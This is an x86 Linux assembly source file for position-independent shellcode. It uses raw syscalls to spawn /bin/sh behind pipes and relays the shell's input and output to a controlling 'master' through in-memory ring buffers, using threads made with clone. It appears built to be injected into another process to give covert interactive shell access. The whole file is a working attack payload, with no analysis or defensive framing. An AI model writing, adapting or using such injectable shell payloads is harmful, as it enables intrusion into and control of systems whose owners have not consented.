;
; $Id$

BITS 32

;		     #   1   2   3   4   5   6
; syscall arguments: EAX EBX ECX EDX ESI EDI EBP
; syscall return: EAX

;
; http://www.lxhp.in-berlin.de/lhpsyscal.html
;
; all necessary system calls:
; ===========================
;
; clone:	eax: 120
; 		ebx: clone-flags
; 		ecx: ptr to top of (distinct) stack space
; 		edx: ptr to pt_regs or NULL
;
; close:	eax: 6
; 		ebx: fd to close
;
; dup2:	eax: 63
; 		ebx: fd 2 dup
; 		ecx: fd to assign the dup to
;
; execve:	eax: 11
; 		ebx: ptr to string of program path&name
; 		ecx: ptr to argv[]
; 		edx: ptr to envv[]
;
; exit:	eax: 1
; 		ebx: exit code
;
; fcntl:	eax: 55
; 		ebx: fd
; 		ecx: command code
; 		edx: file locks: ptr to writable struct flock
;
; fork:	eax: 2
; 		ebx... are passed to forked process.
;
; kill:	eax: 37
; 		ebx: pid (?)
; 		ecx: signal (?)
; 		SIGKILL = 9
;
; nanosleep:	eax: 162
; 		ebx: ptr to struct timespec
; 		ecx: ptr to alterable struct timespec
;
; read:	eax: 3
; 		ebx: fd
; 		ecx: ptr to buffer
; 		edx: count
;
; write:	eax: 4
; 		ebx: fd
; 		ecx: ptr to buffer
; 		edx: count
;
; pipe:	eax: 42
; 		ebx: ptr to dword[2]
;

start:
	call near shcode_start
shcode_start:
	pop	ebp
	add	ebp, data_start - shcode_start

	; pipe(m2sh)
	xor	eax,eax
	mov	al,42
	mov	ebx,ebp
	add	ebx,m2sh_0
	int	0x80

	cmp	eax,0
	jne	child_dead_interleaved

	; pipe(sh2m)
	xor	eax,eax
	mov	al,42
	mov	ebx,ebp
	add	ebx,sh2m_0
	int	0x80

	cmp	eax,0
	jne	child_dead_interleaved

	; fork()
	xor	eax,eax
	mov	al,2
	int	0x80

	cmp	eax,0
	je	child
	jg	parent			; signed compare
child_dead_interleaved:
	jmp	child_dead

child:
	; dup2(m2sh[0], 0)   (dup to stdin)
	xor	eax,eax
	mov	al,63
	mov	ebx,[ebp+m2sh_0]
	xor	ecx,ecx
	int	0x80

	cmp	eax,ecx
	jne	leave_sh_interleaved

	; dup2(sh2m[1], 1)   (dup to stdout)
	xor	eax,eax
	mov	al,63
	mov	ebx,[ebp+sh2m_1]
	inc	ecx
	int	0x80

	cmp	eax,ecx
	jne	leave_sh_interleaved

	; dup2(sh2m[1], 2)   (dup to stderr)
	xor	eax,eax
	mov	al,63
;	mov	ebx,[ebp+sh2m_1]
	inc	ecx
	int	0x80

	cmp	eax,ecx
	jne	leave_sh_interleaved

	; execve("/bin/sh", ["/bin/sh",NULL], [NULL])
	xor	eax,eax
	mov	al,11
	mov	ebx,ebp
	add	ebx,execve_command		; ebx -> '/bin/sh',0

	mov	ecx,ebp
	add	ecx,foo				; ecx -> foo

	xor	edx,edx
	mov	[ecx],ebx			; foo := @'/bin/sh',0
	mov	[ecx+4],edx			; bar := NULL
	mov	edx,ecx
	inc	edx
	inc	edx
	inc	edx
	inc	edx				; edx -> bar
	int	0x80

	; fail if execve did not work.
leave_sh_interleaved:
	jmp	leave_sh

parent:
	; remember child's PID
	mov	[ebp+child_pid],eax

	; close(m2sh[0])
	xor	eax,eax
	mov	al,6
	mov	ebx,[ebp+m2sh_0]
	int	0x80

	; close(sh2m[1])
	xor	eax,eax
	mov	al,6
	mov	ebx,[ebp+sh2m_1]
	int	0x80

	; clone:
	; one thread for reader, one thread for writer
	xor	eax,eax
	mov	al,120
	; CLONE_FS   | CLONE_FILES | CLONE_SIGHAND | CLONE_VM   | CLONE_THREAD
	; 0x00000200 | 0x00000400  | 0x00000800    | 0x00000100 | 0x00010000
	; CLONE_PTRACE = 0x00002000
	mov	ebx,0x00010f00
	mov	ecx,esp	; just use same stack with a delta of 64
	sub	esp,64 ; we need the stack only a tiny bit.
	xor	edx,edx
	int	0x80

	cmp	eax,0
	; ret=0 -> clone
	je	thread_write_to_master_interleaved	; clone is writer
	; ret>0 -> original
	jg	thread_read_from_master			; original is reader
	; error if ret<0
	jmp	child_dead

thread_write_to_master_interleaved:
	jmp	thread_write_to_master

	; ==================================== the READER thread:
thread_read_from_master:
	; will write to child via m2sh[1]
	; remember RINGBUFFER from_master in esi
	mov	esi,ebp
	add	esi,rfrm_buffer

reader_while_fds_ok:
	; while both FDs are ok:
	mov	al,[ebp+to_child_ok]
	add	al,[ebp+from_child_ok]
	cmp	al,2
	jne	leave_sh_second_interleaved

	; test, if master requested child to be terminated
	mov	al,[ebp+terminate_child]
	cmp	al,0
	jne	do_terminate_child

	; if ringbuffer is EMPTY ( _reader == _writer ), do nothing.
	xor	eax,eax
	mov	al,[ebp+rfrm_writer_pos]
	sub	al,[ebp+rfrm_reader_pos]
	cmp	al,0
	je	reader_sleep

	; EAX/AL is the number of bytes to be written to the child.

	; write a single byte to the child.
	xor	eax,eax
	mov	al,4
	mov	ebx,[ebp+m2sh_1]	; EBX := m2sh[1]
	xor	ecx,ecx
	mov	cl,[ebp+rfrm_reader_pos]
	add	ecx,esi			; ECX := reader_pos + buffer_base
	xor	edx,edx
	inc	edx			; EDX := 1
	int	0x80

	xor	ebx,ebx
	inc	ebx
	cmp	eax,ebx
	je	reader_write_to_child_ok

	mov byte [ebp+to_child_ok], 0
	jmp	reader_while_fds_ok

reader_write_to_child_ok:
	; mark byte as read:
	inc byte [ebp+rfrm_reader_pos]
	jmp	reader_while_fds_ok

leave_sh_second_interleaved:
	jmp	leave_sh

reader_sleep:
	call	sleep_short
	jmp	reader_while_fds_ok

do_terminate_child:
	; reset flag
	xor	eax,eax
	mov	[ebp+terminate_child],al
	; send a SIGKILL to child
	mov	al,37
	mov	ebx,[ebp+child_pid]
	xor	ecx,ecx
	mov	cl,9	; SIGKILL
	int	0x80

;	; clear to_child_ok
;	xor	eax,eax
;	mov	[ebp+to_child_ok], eax
;	; and from_child_ok
;	mov	[ebp+from_child_ok], eax
;	jmp	leave_sh

	; don't terminate, wait for child to close pipes. maybe it just relays the signal to other child.
	jmp	reader_while_fds_ok

	; ==================================== the WRITER thread:
thread_write_to_master:
	; will read from child via sh2m[0]
	; remember RINGBUFFER to_master in esi
	mov	esi,ebp
	add	esi,rto_buffer

writer_while_fds_ok:
	; while both FDs are ok:
	mov	al,[ebp+to_child_ok]
	add	al,[ebp+from_child_ok]
	cmp	al,2
	jne	child_dead

	; if ringbuffer is FULL ( _reader == _writer+1 ), do nothing.
	mov	al,[ebp+rto_writer_pos]
	inc	al
	sub	al,[ebp+rto_reader_pos]
	jz	writer_sleep

	; read ONE SINGLE BYTE and pass it into the buffer.
	xor	eax,eax
	mov	al,3
	mov	ebx,[ebp+sh2m_0]
	xor	ecx,ecx
	mov	cl,[ebp+rto_writer_pos]
	add	ecx,esi
	xor	edx,edx
	inc	edx
	int	0x80

	xor	ebx,ebx
	inc	ebx
	cmp	eax,ebx
	je	writer_read_from_child_ok

	mov byte [ebp+from_child_ok],0
	jmp	writer_while_fds_ok

writer_read_from_child_ok:
	inc byte [ebp+rto_writer_pos]

	; we don't need to sleep inside the loop. only sleep, if ringbuffer is full.
	; read() will block if there is no data from child.
	jmp	writer_while_fds_ok

writer_sleep:
	call	sleep_short
	jmp	writer_while_fds_ok

	; ==================================================================

sleep_short:
	; sleep 0.001 seconds:
	; usleep(0,1000000);
	xor	eax,eax
	mov	al, 162
	mov	ebx, ebp
	add	ebx, foo
	mov	ecx, ebx
	xor	edx,edx
	mov long [ebx], edx		; seconds
	mov	edx,100000
	mov long [ebx+4], edx		; nanoseconds
	int	0x80

	ret

child_dead:
	; at most wait 2 seconds for master's ACK
	xor	eax,eax
	cmp	[ebp+child_is_dead_ACK], al
	jne	leave_sh
	mov	al,2
	cmp	[ebp+child_is_dead], al
	ja	leave_sh

	inc byte [ebp]

	; usleep(1,0):
	xor	eax,eax
	mov	al, 162
	mov	ebx, ebp
	add	ebx, foo
	mov	ecx, ebx
	xor	edx,edx
	mov long [ebx+4], edx		; nanoseconds
	inc	edx
	mov long [ebx], edx		; seconds
	int	0x80

	jmp	child_dead

leave_sh:
	; exit-point for BOTH parent:writer&reader and child in case of fail
	xor	eax,eax
	mov	ebx,eax
	inc	eax
	int	0x80

; =============================================================================
; DATA
data_start EQU $

; do not change order of the following stuff!

child_is_dead EQU $ - data_start
	db		0
child_is_dead_ACK EQU $ - data_start
	db		0

terminate_child	EQU $ - data_start
	db		0

to_child_ok EQU $ - data_start
	db		1
from_child_ok EQU $ - data_start
	db		1

; a ringbuffer is EMPTY, if both _writer and _reader point to the same location.
; a ringbuffer is FULL, if _reader == _writer+1

; ringbuffer from_master:

rfrm_writer_pos EQU $ - data_start
	db		0
rfrm_reader_pos EQU $ - data_start
	db		0

; ringbuffer to_master:

rto_writer_pos EQU $ - data_start
	db		0
rto_reader_pos EQU $ - data_start
	db		0

execve_command EQU $ - data_start
	db	'/bin/sh',0

; =============================================================================
; stuff that is not required to be initialized:
align 4

child_pid EQU $ - data_start

; pipes middleman<->shell
m2sh_0 EQU $ - data_start + 4			; shell reads
m2sh_1 EQU $ - data_start + 8			; master writes
sh2m_0 EQU $ - data_start + 12			; master reads
sh2m_1 EQU $ - data_start + 16			; shell writes

rfrm_buffer EQU $ - data_start + 20		; FROM master
rto_buffer EQU $ - data_start + 276		; TO master

foo EQU $ - data_start + 532
bar EQU $ - data_start + 536

